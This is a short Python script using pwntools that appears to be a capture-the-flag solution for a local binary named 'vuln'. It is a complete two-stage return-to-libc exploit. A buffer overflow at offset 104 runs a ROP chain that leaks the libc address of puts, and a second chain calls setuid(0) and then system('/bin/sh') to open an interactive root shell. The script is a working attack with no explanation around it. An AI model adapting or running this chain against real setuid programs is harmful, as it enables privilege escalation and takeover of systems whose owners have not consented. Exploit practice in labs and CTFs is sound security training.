from pwn import *

elf = ELF("./vuln", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
context.binary = elf

offset = 104

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

sh_offset = next(libc.search(b"/bin/sh"))
puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
setuid_offset = libc.symbols["setuid"]

func = 0x401183
pop_rdi = 0x0040117E
ret = 0x0040117F

payload = b""
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(func)

process = process("./vuln")

info("Starting first stage.")

process.sendline(b"A" * offset + payload)

process.recvuntil(b"\x28\x0a")
leak = u64(process.recv()[:-1].ljust(8, b"\x00"))

libc_base = leak - puts_offset

success("Successfully leaked base libc address: " + hex(libc_base))

payload = b""
payload += p64(pop_rdi)
payload += p64(0x0)
payload += p64(libc_base + setuid_offset)
payload += p64(pop_rdi)
payload += p64(libc_base + sh_offset)
payload += p64(libc_base + system_offset)

info("Starting second stage.")

process.sendline(b"A" * offset + payload)

success("pwnd")

process.interactive()
